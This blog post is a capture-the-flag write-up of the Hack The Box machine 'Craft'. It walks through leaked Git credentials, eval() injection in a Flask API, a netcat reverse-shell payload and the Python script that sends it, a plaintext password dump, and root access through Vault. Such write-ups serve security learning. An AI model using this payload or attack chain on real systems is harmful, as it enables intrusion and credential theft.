---
title: "Hack The Box - Craft"
author: Ryan Kozak
layout: post
permalink: /hack-the-box-craft-writeup/
categories:
  - CTF Writeup
  - Security
tags:
  - CTF
  - Hack The Box
  - Linux
  - Privilege Escalation
  - Python
  - Code Execution
  - Gogs
  - Git
  - Vault
---
![Hack The Box Haystack](/wp-content/uploads/2019/08/craft/badge.png)

# Introduction  
Today they retired my favorite box so far, Craft. This box was very real world in the chain of mistakes that lead to each exploit. The beer theme and Silicon Valley theme were also awesome. A+ box, and here's the writeup.


# Information Gathering

## Port Scan: Nmap
We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.

```console
root@kali:~# nmap -sVC 10.10.10.110
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-13 23:23 EDT
Nmap scan report for craft.htb (10.10.10.110)
Host is up (0.40s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey:
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.69 seconds

```
We see from the output above that ports **22** and **443** are open, meaning we've got `ssh` and `https` to play with. Let's explore port **443**.


### Port 443: Craft

![Craft Homepage](/wp-content/uploads/2020/01/craft/craft_homepage.png)
**Figure 1:** Craft's Homepage

So it looks like there are some links to subdomains. Let's add these to our `/etc/hosts` file so that we can access the other virtual hosts running on the box.

```console
root@kali:~# cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 kali
10.10.10.110    craft.htb
10.10.10.110    api.craft.htb
10.10.10.110    gogs.craft.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Now we can access the two links in the upper right hand corner `https://api.craft.htb/api` and `https://gogs.craft.htb`.


We see the documentation page for `Craft API 1.0`. The page gives us some information about the API's endpoints and how to interact with them.

![Craft API 1.0](/wp-content/uploads/2020/01/craft/craft_api_page.png)
**Figure 2:** Craft API 1.0

The other link on the page is to *[Gogs](https://gogs.io/)*, a self hosted git repository. This is fun! It looks like we may get to hack an open source program. Does this remind you of digging through repos on *[GitHub](https://github.com)*?

Going through the commit history we come across some committed credentials right away. The screenshot actually contains the commit in which they were removed, but we can see through red highlighting!

![API Credentials in Commit](/wp-content/uploads/2020/01/craft/gogs_credentials.png)
**Figure 3:** API Credentials in Commit

It looks like these credentials will also log us into the Gogs account for Dinesh, but there's nothing much to see inside Dinesh's account.

By taking a look at the Craft API code we see it's a `Python / Flask` application. Furthermore, it looks like the endpoint `/craft_api/api/brew/endpoints/brew.py` calls the `eval()` function on user input!. It says that authentication is required, but I think we've got that covered already with  `auth=('dinesh', '4aUh0A8PbVJxgd')`.

![Eval code in brew.py](/wp-content/uploads/2020/01/craft/eval_in_brew_endpoint.png)
**Figure 4:** Exploitable code in `/craft_api/api/brew/endpoints/brew.py`.

```python
    @auth.auth_required
    @api.expect(beer_entry)
    def post(self):
        """
        Creates a new brew entry.
        """

        # make sure the ABV value is sane.
        if eval('%s > 1' % request.json['abv']):
            return "ABV must be a decimal value less than 1.0", 400
        else:
            create_brew(request.json)
            return None, 201
```

We could use `curl` or `postman` to send requests to the API, but if we continue to look through the git repo we see in commit `10e3ba4f0a09c778d7cec673f28d410b73455a86` that they've got a test script already to post new brews.

![Added test](/wp-content/uploads/2020/01/craft/added_test.png)
**Figure 5:** add test script you say!?

Download the test script from here and we'll use it to send a payload to the app. `https://gogs.craft.htb/Craft/craft-api/src/10e3ba4f0a09c778d7cec673f28d410b73455a86/tests/test.py`


# Exploitation

## Initial Foothold
So far we've found an API, a `git` repository containing Python code which seems vulnerable to command injection, as well as a commit containing credentials and a test script.

Developing the exploit isn't easy. We can test the code locally but we don't know exactly what's installed on the machine. This process required developing several payloads that ran correctly locally, only to fail on the box. As it turns out, the box doesn't have `bash` installed on it. Eventually we're able to gain a reverse shell using netcat with the following payload sent to `avb`.

```python
"""__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.186 4444 >/tmp/f") """
```

Here's the modified `test.py` script with the payload to call our reverse shell.

```python
#!/usr/bin/env python

import requests
import json

response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
json_response = json.loads(response.text)
token =  json_response['token']

payload = """__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.186 4444 >/tmp/f") """

headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }
# create a sample brew with real shell code... should exploit!
print("Create exploit brew!")
brew_dict = {}
brew_dict['abv'] = payload
brew_dict['name'] = 'bullshit199iii1'
brew_dict['brewer'] = 'bullshit1991'
brew_dict['style'] = 'bullshi1991t'

json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)
```

When we run the script with our sexy little payload we catch a reverse shell, and gain our initial foothold.

```console
root@kali:/media/sf_Research# nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.186] from craft.htb [10.10.10.110] 35703
/bin/sh: can't access tty; job control turned off
/opt/app # whoami
root
/opt/app # cd /
/ # ls -la
total 64
drwxr-xr-x    1 root     root          4096 Feb 10  2019 .
drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
-rwxr-xr-x    1 root     root             0 Feb 10  2019 .dockerenv
...
...
...
/ #
```

## User Flag
It looks like we're in a docker container, so we need to escape that somehow. Under `/opt/app` we see a file named `dbtest.py`. Here are the contents of that file.

```python
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try:
    with connection.cursor() as cursor:
        sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
        cursor.execute(sql)
        result = cursor.fetchone()
        print(result)

finally:
    connection.close()

```

If we modify `dbtest.py` to execute other commands we can explore the application's mysql database a bit more.

First, let's see what tables we have in here. We replace the sql statement above with one to show us the tables, and replace the `fetchone()` command with `fetchall()`.


```python
    with connection.cursor() as cursor:
        sql = "SHOW TABLES"
        cursor.execute(sql)
        result = cursor.fetchall()
        print(result)

finally:
    connection.close()
```

Here's what we get for tables in the craft database.

```console
/opt/app # python hh.py
[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
```

Oh look a `user` table, let's dump that out and see what we get! Again we replace the sql command, this time to display the entire `user` table.

```python
    with connection.cursor() as cursor:
        sql = "SELECT * FROM `user`"
        cursor.execute(sql)
        result = cursor.fetchall()
        print(result)

finally:
    connection.close()
````

```console
/opt/app # python hh.py
[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
```

Oh my, they're storing passwords in plain text! There must be some credential stuffing we can do with all these.

We already had the credentials for dinesh, but now we've got the credentials for everyone. It doesn't look like we can ssh in with any of these creds, but let's go back to Gogs and start trying them there. We already know that dinesh reused his password, so maybe the others did too.

It looks like we can login as gilfoyle, and it seems he's got a private repository in his account.

![private repository](/wp-content/uploads/2020/01/craft/private_repo.png)
**Figure 5:** craft_infra private repo.

When we explore the private `craft_infra` repository, we see that this crazy dude committed his private and public keys.

![ssh keys](/wp-content/uploads/2020/01/craft/id_rsa_pub.png)
**Figure 6:** ssh keys inside.

Another really interesting bit of information in this private repo is in `craft_infra/vault/secrets.sh`.

![vault secrets](/wp-content/uploads/2020/01/craft/vault_secrets_sh.png)
**Figure 7:** vault secrets!

It appears as though he's running `vault` as root. Once we get access to the user flag, we'll probably be using this for our privilege escalation to root.

First, let's add the keys we've found to our own `~/.ssh/` directory in kali and see if we can get the user flag finally.

```console
root@kali:~/.ssh# ssh-add
Enter passphrase for /root/.ssh/id_rsa:
Identity added: /root/.ssh/id_rsa (gilfoyle@craft.htb)
root@kali:~/.ssh# ssh gilfoyle@craft.htb


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 13 18:45:12 2019 from 10.10.14.167
gilfoyle@craft:~$ cat user.txt
bbf4b0cadfa3d4e6d0914c9cd5a612d4
gilfoyle@craft:~$
```

After adding gilfoyle's keys and using his password once again for `ssh-add`, you can see we gain the user flag. On to the root portion we go.

## Root Flag
Now we already know about something very important, and thats `vault`. After some research on how to craft the command we're able to easily gain a root shell through this application.

```console
gilfoyle@craft:/$ vault ssh -mode=otp -role=root_otp root@craft.htb
Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,
Vault can automatically perform this step for you.
OTP for the session is: 60fafe1c-2221-6dd7-d16f-9c6ba0c996eb


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Password:
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 13 18:48:35 2019 from ::1
root@craft:~# cat /root/root.txt
831d64ef54d92c1af795daae28a11591
root@craft:~#
```

That's all there is!

![rooted](/wp-content/uploads/2020/01/craft/rooted.png)
**Figure 8:** rooted.

# Conclusion
This box was fun from the beginning. I enjoyed going through the `Flask` code in the `git` repository to find a vulnerability, as well as finding the credentials and test script in an old commit. This gain of the initial foothold seemed to me to be **very realistic**. I've seen this type of mistake chain a lot in my years as a developer. Developing the exploit to get code execution was rather difficult (for me at least). Not knowing bash wasn't installed held me up for quite a while on this phase.

I will say that storing credentials in plain text is probably almost as bad, or worse, than using the `eval()` function, but some people still do this crap too. Running vault as root is also a mistake, but a lazy developer may do too for one reason or another. All in all Craft has been my absolute favorite box thus far.

# References
1. [http://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html](http://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html)
2. [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
3. [https://stackoverflow.com/questions/44250002/how-to-solve-sign-and-send-pubkey-signing-failed-agent-refused-operation](https://stackoverflow.com/questions/44250002/how-to-solve-sign-and-send-pubkey-signing-failed-agent-refused-operation)
4. [https://www.vaultproject.io/docs/commands/ssh.html](https://www.vaultproject.io/docs/commands/ssh.html)
